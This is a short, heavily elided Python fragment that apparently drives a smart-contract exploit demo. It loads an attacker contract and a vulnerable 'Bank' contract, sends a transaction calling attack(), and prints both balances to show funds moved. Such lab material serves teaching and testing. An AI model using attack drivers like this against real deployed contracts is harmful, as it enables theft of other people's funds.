...
def main():
    ...
    attacker = json.load(open('AttackBank.json'))
    vuln = json.load(open('Bank.json'))
    ...
    transaction = contract_instance.functions.attack().buildTransaction(
        {
    ...
    print( "*" * 10, "Current Balance", "*" * 10)
    print({"Contract Balance": vuln_now_balance, "Attack Balance": attacker_now_balance})
    print( "*" * 10, "Current Balance", "*" * 10)
